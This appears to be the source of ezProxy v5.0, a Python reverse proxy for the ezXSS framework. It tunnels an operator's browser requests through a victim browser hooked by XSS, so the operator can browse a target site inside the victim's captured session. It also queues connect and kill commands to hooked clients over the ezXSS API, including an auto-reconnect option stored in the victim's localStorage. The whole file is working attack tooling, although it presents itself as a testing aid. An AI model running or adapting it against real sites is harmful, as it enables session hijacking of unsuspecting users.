#!/usr/bin/env python3
import argparse
import asyncio
import base64
import hashlib
import hmac
import http.client
import json
import logging
import os
import ssl
import struct
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zlib
from urllib.parse import urlsplit

"""
The ezXSS persistent proxy is a reverse proxy that can only be used in combination with a ezXSS installation.
After starting the proxy, users can insert the domain and port used into a persistent session in the ezXSS management panel.
This feature enables easy and secure testing of persistent XSS vulnerabilities on a target website.
For additional information and support, please visit the ezXSS wiki on GitHub at https://github.com/ssl/ezXSS/wiki
"""

BANNER = """
                              ████     █████  █████████      █████████
                              ██████ ███████ ████   █████  █████   █████
  ███████████  ██████████████   ██████████   ████          █████
 ████     ████       ██████       ██████      ██████████     ██████████     ezProxy v5.0
 █████████████     ██████       ██████████            ████           ████   github.com/ssl/ezXSS
 ████            ███████      ██████ ███████ ████     ████ █████     ████
   ██████████  ██████████████ ████     █████  ███████████    ██████████     made with <3
"""

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

MAX_MESSAGE_SIZE = 10 * 1024 * 1024
MAX_REQUEST_HEADER_SIZE = 64 * 1024
REQUEST_TIMEOUT = 30
HANDSHAKE_TIMEOUT = 15

logger = logging.getLogger("ezproxy")

connected_clients = {}
passed_origins = {}
pending_requests = {}
pending_by_client = {}


def _logsafe(value, limit=100):
    """Strip control characters from an untrusted value before it is printed or logged."""
    text = str(value)
    cleaned = "".join(ch for ch in text if ch >= " " and ch != "\x7f")
    return cleaned[:limit]


class WebSocketError(Exception):
    pass


class WebSocketConnection:
    OP_CONT = 0x0
    OP_TEXT = 0x1
    OP_BIN = 0x2
    OP_CLOSE = 0x8
    OP_PING = 0x9
    OP_PONG = 0xA

    def __init__(self, reader, writer):
        self.reader = reader
        self.writer = writer
        self._send_lock = asyncio.Lock()
        self.closed = False

    @property
    def peer(self):
        try:
            return self.writer.get_extra_info("peername")
        except Exception:
            return None

    async def handshake(self):
        raw = await self.reader.readuntil(b"\r\n\r\n")
        lines = raw.decode("iso-8859-1").split("\r\n")

        headers = {}
        for line in lines[1:]:
            if ":" in line:
                name, value = line.split(":", 1)
                headers[name.strip().lower()] = value.strip()

        key = headers.get("sec-websocket-key")
        upgrade = headers.get("upgrade", "").lower()
        if upgrade != "websocket" or not key:
            self.writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")
            await self.writer.drain()
            raise WebSocketError("not a WebSocket upgrade request")

        accept = base64.b64encode(
            hashlib.sha1((key + WS_GUID).encode("ascii")).digest()
        ).decode("ascii")

        response = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Accept: " + accept + "\r\n\r\n"
        )
        self.writer.write(response.encode("ascii"))
        await self.writer.drain()

    async def _read_exact(self, n):
        return await self.reader.readexactly(n)

    async def _read_frame(self):
        header = await self._read_exact(2)
        b0, b1 = header[0], header[1]
        fin = (b0 & 0x80) != 0
        opcode = b0 & 0x0F
        masked = (b1 & 0x80) != 0
        length = b1 & 0x7F

        if (opcode & 0x08) and (not fin or length > 125):
            raise WebSocketError("invalid control frame")

        if length == 126:
            length = struct.unpack("!H", await self._read_exact(2))[0]
        elif length == 127:
            length = struct.unpack("!Q", await self._read_exact(8))[0]

        if length > MAX_MESSAGE_SIZE:
            raise WebSocketError("frame exceeds MAX_MESSAGE_SIZE")

        if not masked:
            raise WebSocketError("received unmasked frame from client")

        mask = await self._read_exact(4)
        data = await self._read_exact(length) if length else b""

        if data:
            data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))

        return fin, opcode, data

    async def recv(self):
        chunks = []
        total = 0
        msg_opcode = None
        while True:
            fin, opcode, data = await self._read_frame()

            if opcode == self.OP_CLOSE:
                await self.close()
                raise WebSocketError("connection closed by peer")
            if opcode == self.OP_PING:
                await self._send(self.OP_PONG, data)
                continue
            if opcode == self.OP_PONG:
                continue

            if opcode in (self.OP_TEXT, self.OP_BIN):
                msg_opcode = opcode
            elif opcode == self.OP_CONT:
                pass
            else:
                raise WebSocketError("unexpected opcode %s" % opcode)

            chunks.append(data)
            total += len(data)
            if total > MAX_MESSAGE_SIZE:
                raise WebSocketError("message exceeds MAX_MESSAGE_SIZE")

            if fin:
                break

        payload = b"".join(chunks)
        if msg_opcode == self.OP_TEXT:
            return payload.decode("utf-8", "replace")
        return payload

    async def _send(self, opcode, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        length = len(data)
        header = bytearray()
        header.append(0x80 | opcode)
        if length < 126:
            header.append(length)
        elif length < (1 << 16):
            header.append(126)
            header += struct.pack("!H", length)
        else:
            header.append(127)
            header += struct.pack("!Q", length)

        async with self._send_lock:
            self.writer.write(bytes(header) + data)
            await self.writer.drain()

    async def send(self, text):
        await self._send(self.OP_TEXT, text)

    async def close(self):
        if self.closed:
            return
        self.closed = True
        try:
            await self._send(self.OP_CLOSE, b"")
        except Exception:
            pass
        try:
            self.writer.close()
            await self.writer.wait_closed()
        except Exception:
            pass


async def handle_websocket(reader, writer):
    ws = WebSocketConnection(reader, writer)
    client_id = None
    try:
        await asyncio.wait_for(ws.handshake(), timeout=HANDSHAKE_TIMEOUT)
    except Exception as exc:
        logger.debug("WebSocket handshake failed: %s", exc)
        try:
            writer.close()
        except Exception:
            pass
        return

    try:
        while True:
            try:
                message = await ws.recv()
            except WebSocketError:
                break

            try:
                data = json.loads(message)
            except json.JSONDecodeError as exc:
                logger.error("Failed to parse JSON message: %s", exc)
                continue

            if client_id is None:
                client_id = (data.get("clientid") or "").lower()
                if not client_id:
                    logger.error("No client ID provided in initial message")
                    continue

                if client_id in connected_clients:
                    old = connected_clients[client_id]
                    logger.info("Client %s reconnecting - closing old connection", client_id)
                    await old.close()
                    _purge_pending(client_id)

                connected_clients[client_id] = ws
                print("\n[!] Client connected with client ID: %s" % _logsafe(client_id))
                print("[!] Origin: %s" % _logsafe(data.get("origin", "unknown")))

                if str(data.get("pass", "")).lower() in ("true", "1", "yes", "on"):
                    origin = data.get("origin")
                    if origin:
                        held = passed_origins.get(origin)
                        if held and held != client_id and held in connected_clients:
                            logger.warning(
                                "Refusing to remap live origin %s (held by %s)", _logsafe(origin), _logsafe(held)
                            )
                            print("[>] Accessible on http://%s.ezxss" % _logsafe(client_id))
                        else:
                            print("[>] Accessible on http://%s.ezxss and http://%s" % (_logsafe(client_id), _logsafe(origin)))
                            passed_origins[origin] = client_id
                else:
                    print("[>] Accessible on http://%s.ezxss" % _logsafe(client_id))
            else:
                if "body" in data:
                    if client_id not in connected_clients:
                        logger.debug("Ignoring response from disconnected client %s", client_id)
                        continue
                    request_id = data.get("request_id")
                    if request_id and request_id in pending_requests:
                        await pending_requests[request_id].put(message)
                        logger.info("Response queued for request_id: %s", request_id)
                    elif request_id:
                        logger.warning("Response for unknown request_id: %s", request_id)
                    else:
                        logger.warning("Response missing request_id from client %s", client_id)
                else:
                    logger.debug("Non-response message from client %s: %s", client_id, data.get("type", "unknown"))
    except Exception as exc:
        logger.error("Error in websocket handler for client %s: %s", client_id, exc)
    finally:
        await ws.close()
        if client_id is not None:
            if connected_clients.get(client_id) is ws:
                connected_clients.pop(client_id, None)
            _purge_pending(client_id)
            for origin in [o for o, cid in passed_origins.items() if cid == client_id]:
                passed_origins.pop(origin, None)


def _purge_pending(client_id):
    for req_id in pending_by_client.pop(client_id, set()):
        pending_requests.pop(req_id, None)


def _basic_auth_token(username, password):
    return base64.b64encode(("%s:%s" % (username, password)).encode("utf-8")).decode("utf-8")


def _is_textual(content_type):
    ct = str(content_type or "").lower()
    if not ct:
        return True
    if ct.startswith("text/"):
        return True
    return any(token in ct for token in
               ("html", "json", "javascript", "ecmascript", "xml", "css", "svg"))


async def _read_request_head(reader):
    buf = bytearray()
    while True:
        crlf = buf.find(b"\r\n\r\n")
        lf = buf.find(b"\n\n")
        if crlf != -1 and (lf == -1 or crlf <= lf):
            return bytes(buf[:crlf]), bytes(buf[crlf + 4:])
        if lf != -1:
            return bytes(buf[:lf]), bytes(buf[lf + 2:])
        if len(buf) > MAX_REQUEST_HEADER_SIZE:
            raise WebSocketError("request headers exceed MAX_REQUEST_HEADER_SIZE")
        chunk = await reader.read(4096)
        if not chunk:
            return None, b""
        buf += chunk


def _parse_content_length(head_lines):
    for line in head_lines[1:]:
        if ":" not in line:
            continue
        name, value = line.split(":", 1)
        if name.strip().lower() == "content-length":
            try:
                return int(value.strip())
            except ValueError:
                return None
    return None


async def handle_proxy(reader, writer, cfg):
    try:
        try:
            request_head, leftover = await asyncio.wait_for(
                _read_request_head(reader), timeout=HANDSHAKE_TIMEOUT
            )
        except asyncio.TimeoutError:
            return
        except WebSocketError:
            logger.warning("Request headers exceed the read buffer limit")
            return
        if request_head is None:
            return

        head_lines = request_head.decode("ISO-8859-1").splitlines()
        if not head_lines or not head_lines[0]:
            return

        parts = head_lines[0].split(" ")
        if len(parts) < 2:
            return
        request_method, request_uri = parts[0], parts[1]

        content_length = _parse_content_length(head_lines)
        if content_length is not None and (content_length < 0 or content_length > MAX_MESSAGE_SIZE):
            logger.warning("Rejecting request with invalid Content-Length %s", content_length)
            return

        if content_length is None:
            request_body = leftover
        elif content_length <= len(leftover):
            request_body = leftover[:content_length]
        else:
            try:
                request_body = leftover + await asyncio.wait_for(
                    reader.readexactly(content_length - len(leftover)), timeout=REQUEST_TIMEOUT
                )
            except asyncio.IncompleteReadError as exc:
                request_body = leftover + exc.partial
            except asyncio.TimeoutError:
                logger.warning("Timed out reading request body (%s bytes expected)", content_length)
                return

        parsed = urlsplit(request_uri)
        domain = parsed.netloc
        content_type = "text/html; charset=utf-8"
        response_headers = {}
        status_code = 200
        response_body = b"You can not browse the internet while on the ezXSS proxy."

        if cfg.use_login:
            expected = "Basic " + _basic_auth_token(cfg.username, cfg.password)
            auth = [h for h in head_lines if h.lower().startswith("authorization")]
            got = auth[0].split(" ", 1)[1].strip() if (auth and " " in auth[0]) else ""
            if not auth or not hmac.compare_digest(got, expected):
                writer.write(b'HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm="Proxy"\r\n\r\n')
                writer.write(response_body)
                await writer.drain()
                return

        client_id = None
        do_proxy = False
        if domain.endswith(".ezxss"):
            client_id = domain[:-6]
            do_proxy = True
        elif domain in passed_origins:
            client_id = passed_origins[domain]
            do_proxy = True

        if do_proxy and client_id:
            full_uri = (parsed.path or "/") + (("?" + parsed.query) if parsed.query else "")
            logger.info("Browser request: %s %s (client: %s)", request_method, full_uri, client_id)

            if client_id in connected_clients:
                request_id = "%s_%s" % (client_id, uuid.uuid4().hex)
                queue = asyncio.Queue()
                pending_requests[request_id] = queue
                pending_by_client.setdefault(client_id, set()).add(request_id)
                client_response = None
                received = False
                try:
                    await connected_clients[client_id].send(json.dumps({
                        "method": request_method,
                        "request_uri": full_uri,
                        "postData": request_body.decode("ISO-8859-1"),
                        "request_id": request_id,
                    }))

                    loop = asyncio.get_running_loop()
                    deadline = loop.time() + REQUEST_TIMEOUT
                    while not received:
                        remaining = deadline - loop.time()
                        if remaining <= 0:
                            break
                        try:
                            msg = await asyncio.wait_for(queue.get(), timeout=remaining)
                        except asyncio.TimeoutError:
                            break

                        data = json.loads(msg)
                        if "body" not in data:
                            logger.warning("Response missing body for %s", full_uri)
                            continue

                        body_data = data["body"]
                        try:
                            if data.get("compressed", False):
                                client_response = decompress_response(body_data, True)
                            else:
                                client_response = base64.b64decode(body_data)
                        except Exception as exc:
                            logger.warning("Failed to decode body for %s: %s", full_uri, exc)
                            client_response = body_data.encode("utf-8") if isinstance(body_data, str) else body_data

                        content_type = data.get("content_type", "text/html")
                        if isinstance(data.get("headers"), dict):
                            response_headers = data["headers"]
                            if "content-type" in response_headers:
                                content_type = response_headers["content-type"]
                        try:
                            status_code = int(data.get("statusCode", 200) or 200)
                        except (TypeError, ValueError):
                            status_code = 200
                        if status_code < 100 or status_code > 599:
                            status_code = 200
                        received = True
                        logger.info(
                            "Response received for %s (%s bytes, upstream status %s)",
                            full_uri, len(client_response), data.get("statusCode", 200),
                        )

                    if not received:
                        logger.warning("Timeout waiting for response to %s", full_uri)
                finally:
                    pending_requests.pop(request_id, None)
                    reqs = pending_by_client.get(client_id)
                    if reqs is not None:
                        reqs.discard(request_id)
                        if not reqs:
                            pending_by_client.pop(client_id, None)

                if received and client_response is not None:
                    response_body = client_response
                else:
                    status_code = 504
                    response_body = ("No response received for %s within %s seconds" % (full_uri, REQUEST_TIMEOUT)).encode("utf-8")
            else:
                status_code = 502
                response_body = ('No connected client found with client ID "%s"' % client_id).encode("utf-8")

        if not isinstance(response_body, bytes):
            response_body = str(response_body).encode("utf-8")

        if _is_textual(content_type):
            response_body = response_body.replace(b"https://", b"http://")

        def _no_crlf(v):
            return str(v).replace("\r", "").replace("\n", "")

        hop_by_hop = (
            "content-length", "content-encoding", "transfer-encoding",
            "connection", "keep-alive", "proxy-authenticate",
            "proxy-authorization", "te", "trailer", "upgrade",
        )
        reason = http.client.responses.get(status_code, "")
        head = ["HTTP/1.1 %d %s" % (status_code, reason)]
        for name, value in response_headers.items():
            if str(name).lower() in hop_by_hop:
                continue
            head.append("%s: %s" % (_no_crlf(name), _no_crlf(value)))
        head.append("Content-Length: %s" % len(response_body))
        head.append("Connection: close")
        if not any(h.lower().startswith("content-type:") for h in head[1:]):
            head.append("Content-Type: %s" % _no_crlf(content_type))

        writer.write(("\r\n".join(head) + "\r\n\r\n").encode("utf-8"))
        writer.write(response_body)
        await writer.drain()
    except Exception as exc:
        logger.error("Error while processing request: %s", exc)
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


def decompress_response(data, is_compressed):
    decoded = base64.b64decode(data)
    if not is_compressed:
        return decoded
    d = zlib.decompressobj(32 + zlib.MAX_WBITS)
    out = d.decompress(decoded, MAX_MESSAGE_SIZE + 1)
    if len(out) > MAX_MESSAGE_SIZE or d.unconsumed_tail:
        raise WebSocketError("decompressed response exceeds MAX_MESSAGE_SIZE")
    return out + d.flush()


def _api_request(cfg, method, path, body=None):
    if not cfg.api_url or not cfg.api_token:
        raise SystemExit("EZXSS_API_URL and EZXSS_API_TOKEN (or --api-url/--api-token) are required for this command")

    url = cfg.api_url.rstrip("/") + path
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", "Bearer " + cfg.api_token)
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as resp:
            payload = resp.read().decode("utf-8")
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode("utf-8", "replace")
        raise SystemExit("API %s %s -> HTTP %s: %s" % (method, path, exc.code, detail))
    except urllib.error.URLError as exc:
        raise SystemExit("API %s %s -> %s" % (method, path, exc))

    try:
        return json.loads(payload)
    except json.JSONDecodeError:
        raise SystemExit("API returned non-JSON: %s" % payload)


def _resolve_session_id(cfg, client_id):
    result = _api_request(cfg, "GET", "/api/sessions?client_id=" + urllib.parse.quote(client_id))
    rows = result.get("data") or []
    if not rows:
        raise SystemExit('No session found for client id "%s"' % client_id)
    return int(rows[0]["id"])


def cmd_connect(cfg):
    session_id = _resolve_session_id(cfg, cfg.client)
    body = {"ipport": cfg.ipport, "passorigin": cfg.passorigin, "autoreconnect": cfg.autoreconnect}
    result = _api_request(cfg, "POST", "/api/console/proxy/%d" % session_id, body)
    data = result.get("data") or {}
    print(data.get("message") or "Proxy connect command queued for %s" % cfg.client)


def cmd_kill(cfg):
    session_id = _resolve_session_id(cfg, cfg.client)
    _api_request(cfg, "POST", "/api/console/kill/%d" % session_id, {})
    print("Kill (ez_stop) command queued for %s" % cfg.client)


async def run_serve(cfg):
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    try:
        ssl_context.load_cert_chain(cfg.cert, keyfile=cfg.key)
    except Exception as exc:
        raise SystemExit("Error while loading SSL cert: %s" % exc)

    ws_server = await asyncio.start_server(
        lambda r, w: handle_websocket(r, w), cfg.host, cfg.ws_port, ssl=ssl_context
    )
    proxy_server = await asyncio.start_server(lambda r, w: handle_proxy(r, w, cfg), cfg.host, cfg.proxy_port)

    print("[#] WebSocket (wss) running on %s:%s" % (cfg.hostname, cfg.ws_port))
    print("[#] HTTP proxy running on %s:%s" % (cfg.hostname, cfg.proxy_port))
    print("")

    async with ws_server, proxy_server:
        await asyncio.gather(ws_server.serve_forever(), proxy_server.serve_forever())


def cmd_serve(cfg):
    try:
        asyncio.run(run_serve(cfg))
    except KeyboardInterrupt:
        print("\n[#] Shutting down")


def _env(name, default=None):
    value = os.getenv(name)
    return value if value not in (None, "") else default


def _env_bool(name):
    return _env(name) in ("1", "true", "True", "yes", "on")


def _env_int(name, default):
    value = _env(name)
    if value is None:
        return default
    try:
        return int(value)
    except ValueError:
        raise SystemExit("%s must be an integer (got %r)" % (name, value))


def build_parser():
    parser = argparse.ArgumentParser(description="ezXSS 5.0 persistent reverse proxy (stdlib-only).")
    sub = parser.add_subparsers(dest="command", required=True)

    serve = sub.add_parser("serve", help="Run the WebSocket relay + HTTP proxy servers.")
    serve.add_argument("--host", default=_env("prHost", "127.0.0.1"),
                       help="Bind address. Defaults to loopback; set 0.0.0.0 (or prHost) to expose it.")
    serve.add_argument("--ws-port", type=int, default=_env_int("prWebPort", 8443))
    serve.add_argument("--proxy-port", type=int, default=_env_int("prProxyPort", 8080))
    serve.add_argument("--cert", default=_env("prCertFile"), help="TLS certificate (PEM).")
    serve.add_argument("--key", default=_env("prKeyFile"), help="TLS private key (PEM).")
    serve.add_argument("--hostname", default=_env("prHostname", _env("prHost", "localhost")),
                       help="Public hostname printed in URLs (replaces the 4.x cert-CN lookup).")
    serve.add_argument("--use-login", action="store_true", default=_env_bool("prUseLogin"),
                       help="Require HTTP Basic auth on the proxy port.")
    serve.add_argument("--user", dest="username", default=_env("prUser", ""))
    serve.add_argument("--password", default=_env("prPassword", ""))
    serve.add_argument("--log-level", default=_env("prLogLevel", "WARNING"))

    for name, help_text in (("connect", "Enqueue a proxy-connect (ez_soc) command via the ezXSS API."),
                            ("kill", "Enqueue a kill (ez_stop) command via the ezXSS API.")):
        api = sub.add_parser(name, help=help_text)
        api.add_argument("--client", required=True, help="Target client id (ra_client()).")
        api.add_argument("--api-url", default=_env("EZXSS_API_URL"), help="ezXSS base URL.")
        api.add_argument("--api-token", default=_env("EZXSS_API_TOKEN"), help="ezXSS API key (bearer token).")
        if name == "connect":
            api.add_argument("--ipport", required=True, help="This proxy's host:port the target connects to.")
            api.add_argument("--passorigin", action="store_true", help="Also expose the target's own origin.")
            api.add_argument("--autoreconnect", action="store_true", help="Persist auto-reconnect in localStorage.")

    return parser


def main(argv=None):
    print(BANNER)
    cfg = build_parser().parse_args(argv)

    if cfg.command == "serve":
        logging.basicConfig(
            level=getattr(logging, str(cfg.log_level).upper(), logging.WARNING),
            format="%(asctime)s - %(levelname)s - %(message)s",
        )
        if not cfg.cert or not cfg.key:
            raise SystemExit("serve requires --cert and --key (or prCertFile / prKeyFile)")

        loopback = ("127.0.0.1", "::1", "localhost", "")
        if cfg.host not in loopback and not cfg.use_login:
            raise SystemExit(
                "Refusing to bind the proxy to a non-loopback host (%s) without --use-login.\n"
                "The HTTP proxy port exposes the captured session to anyone who can reach it.\n"
                "Either add --use-login (with --user/--password), or bind 127.0.0.1 and reach it "
                "over an SSH tunnel." % cfg.host
            )
        if cfg.use_login and (not cfg.username or not cfg.password):
            raise SystemExit("--use-login requires a non-empty --user and --password (prUser / prPassword).")

        cmd_serve(cfg)
    elif cfg.command == "connect":
        cmd_connect(cfg)
    elif cfg.command == "kill":
        cmd_kill(cfg)


if __name__ == "__main__":
    main(sys.argv[1:])
